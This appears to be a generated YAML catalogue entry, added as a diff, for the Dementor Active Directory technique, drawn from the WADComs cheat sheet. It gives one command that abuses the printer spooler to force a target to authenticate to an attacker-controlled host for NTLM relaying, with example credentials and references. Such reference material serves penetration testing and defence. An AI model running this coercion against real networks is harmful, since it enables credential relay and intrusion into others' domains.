@@ -1,0 +1,82 @@
+id: wadcoms/Dementor
+type: technique
+platform: active-directory
+name: Dementor
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1
+  comment: "dementor.py interacts with the printer spooler on a host to trigger an authentication from\
+    \ the target IP to an attacker controlled host (usually an SMB or HTTP server). This captured authentication\
+    \ can then be relayed to authenticated to other hosts. See more in ntlmrelayx.py.\n\nCommand Reference:\n\
+    \n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\
+    \n\tPassword: password123\n"
+references:
+- https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc
+- https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack
+tags:
+- active-directory
+- wadcoms
+- rpc
+- ntlm
+source_data:
+  WADComs:
+    raw:
+      file: Dementor.md
+      document: "---\ndescription: |\n  dementor.py interacts with the printer spooler on a host to trigger\
+        \ an authentication from the target IP to an attacker controlled host (usually an SMB or HTTP\
+        \ server). This captured authentication can then be relayed to authenticated to other hosts. See\
+        \ more in ntlmrelayx.py.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tAttacker\
+        \ IP: 10.10.10.2\n\n  \tDomain: test.local\n\n  \tUsername: john\n\n  \tPassword: password123\n\
+        \ncommand: |\n  python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1\n\
+        items:\n  - Password\n  - Username\nservices:\n  - RPC\n  - NTLM\nOS:\n  - Linux\n  - Windows\n\
+        attack_types:\n  - Exploitation\nreferences:\n  - https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc\n\
+        \  - https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:b075ad0352e4f861ceb86225189d8310c4e2ed85ebf7066c49abfacafca12abd
